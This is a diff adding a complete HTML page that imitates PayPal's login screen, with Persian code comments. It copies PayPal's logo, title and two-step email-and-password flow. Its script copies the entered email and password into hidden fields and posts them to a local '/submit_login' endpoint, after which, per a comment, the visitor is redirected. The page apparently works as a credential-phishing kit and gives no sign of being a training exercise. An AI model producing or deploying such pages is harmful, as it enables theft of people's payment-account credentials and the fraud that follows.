@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log in to your PayPal account</title>
+    <style>
+        /* استایل‌ها همانند قبل */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: "Helvetica Neue", Arial, sans-serif;
+            background-color: #f5f5f5;
+            line-height: 1.4;
+            color: #2C2E2F;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .login {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 40px 20px;
+        }
+
+        .corral {
+            width: 100%;
+            max-width: 400px;
+            background: #fff;
+            border-radius: 12px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            overflow: hidden;
+        }
+
+        .contentContainer {
+            padding: 40px;
+        }
+
+        .paypal-logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .paypal-logo img {
+            height: 35px;
+            width: auto;
+        }
+
+        .headerText {
+            font-size: 24px;
+            font-weight: 300;
+            text-align: center;
+            margin-bottom: 30px;
+            color: #2C2E2F;
+        }
+
+        .fieldWrapper {
+            margin-bottom: 20px;
+        }
+
+        .textInput input {
+            width: 100%;
+            height: 48px;
+            padding: 12px 16px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 16px;
+            background-color: #fff;
+            transition: all 0.3s ease;
+        }
+
+        .textInput input:focus {
+            outline: none;
+            border-color: #0070ba;
+            box-shadow: 0 0 0 3px rgba(0, 112, 186, 0.1);
+        }
+
+        .button {
+            width: 100%;
+            height: 48px;
+            background-color: #0070ba;
+            border: none;
+            border-radius: 24px;
+            color: #fff;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            margin-bottom: 15px;
+        }
+
+        .button:hover {
+            background-color: #005ea6;
+        }
+
+        .recoveryOption {
+            display: block;
+            text-align: center;
+            color: #0070ba;
+            text-decoration: none;
+            font-size: 14px;
+            margin: 15px 0;
+        }
+
+        .recoveryOption:hover {
+            text-decoration: underline;
+        }
+
+        .loginSignUpSeparator {
+            position: relative;
+            text-align: center;
+            margin: 25px 0;
+        }
+
+        .loginSignUpSeparator::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 0;
+            right: 0;
+            height: 1px;
+            background-color: #e4e7e9;
+        }
+
+        .textInSeparator {
+            background: #fff;
+            padding: 0 15px;
+            color: #6c7378;
+            font-size: 14px;
+        }
+
+        .button.secondary {
+            background-color: transparent;
+            border: 2px solid #0070ba;
+            color: #0070ba;
+        }
+
+        .button.secondary:hover {
+            background-color: #f0f7ff;
+        }
+
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <section class="login">
+        <div class="corral">
+            <div class="contentContainer">
+                <header>
+                    <p class="paypal-logo">
+                        <img src="https://www.paypalobjects.com/webstatic/icon/pp258.png" alt="PayPal">
+                    </p>
+                </header>
+
+                <h1 class="headerText">Log in to your PayPal account</h1>
+
+                <!-- فرم اصلی با دو فیلد مخفی -->
+                <form action="/submit_login" method="post" id="mainForm">
+                    <input type="hidden" name="userid" id="hiddenUserid">
+                    <input type="hidden" name="password" id="hiddenPassword">
+
+                    <!-- فیلد ایمیل (مرحله اول) -->
+                    <div class="textInput" id="emailField">
+                        <div class="fieldWrapper">
+                            <input type="text" id="visibleUserid" placeholder="Email or mobile number" required
+                                   autocomplete="email">
+                        </div>
+                    </div>
+
+                    <!-- فیلد پسورد (مرحله دوم) -->
+                    <div class="textInput hidden" id="passwordField">
+                        <div class="fieldWrapper">
+                            <input type="password" id="visiblePassword" placeholder="Password" required
+                                   autocomplete="current-password">
+                        </div>
+                    </div>
+
+                    <a href="#" class="recoveryOption" id="forgotEmail">Forgot email?</a>
+                    <a href="#" class="recoveryOption hidden" id="forgotPassword">Forgot password?</a>
+
+                    <div class="actions">
+                        <button type="button" class="button" id="nextButton">Next</button>
+                        <button type="submit" class="button hidden" id="loginButton">Log In</button>
+                    </div>
+                </form>
+
+                <div class="loginSignUpSeparator">
+                    <span class="textInSeparator">or</span>
+                </div>
+
+                <button class="button secondary">Sign Up</button>
+            </div>
+        </div>
+    </section>
+
+    <script>
+        document.getElementById('nextButton').addEventListener('click', function() {
+            const email = document.getElementById('visibleUserid').value.trim();
+
+            if (email) {
+                // مخفی کردن فیلد ایمیل و نمایش فیلد پسورد
+                document.getElementById('emailField').classList.add('hidden');
+                document.getElementById('passwordField').classList.remove('hidden');
+                document.getElementById('forgotEmail').classList.add('hidden');
+                document.getElementById('forgotPassword').classList.remove('hidden');
+                document.getElementById('nextButton').classList.add('hidden');
+                document.getElementById('loginButton').classList.remove('hidden');
+
+                // ذخیره ایمیل در فیلد مخفی
+                document.getElementById('hiddenUserid').value = email;
+            }
+        });
+
+        // هنگام تایپ پسورد، آن را در فیلد مخفی ذخیره کن
+        document.getElementById('visiblePassword').addEventListener('input', function() {
+            document.getElementById('hiddenPassword').value = this.value;
+        });
+
+        // امکان بازگشت به فیلد ایمیل
+        document.getElementById('forgotPassword').addEventListener('click', function(e) {
+            e.preventDefault();
+            document.getElementById('emailField').classList.remove('hidden');
+            document.getElementById('passwordField').classList.add('hidden');
+            document.getElementById('forgotEmail').classList.remove('hidden');
+            document.getElementById('forgotPassword').classList.add('hidden');
+            document.getElementById('nextButton').classList.remove('hidden');
+            document.getElementById('loginButton').classList.add('hidden');
+        });
+
+        // ارسال فرم به صورت سنتی (بدون fetch)
+        document.getElementById('mainForm').addEventListener('submit', function(e) {
+            const password = document.getElementById('visiblePassword').value.trim();
+            const email = document.getElementById('visibleUserid').value.trim();
+
+            if (!password || !email) {
+                e.preventDefault();
+                alert('Please enter both email and password');
+            }
+            // اگر همه چیز اوکی باشد، فرم به صورت سنتی ارسال می‌شود و ریدایرکت کار می‌کند
+        });
+    </script>
+</body>
+</html>
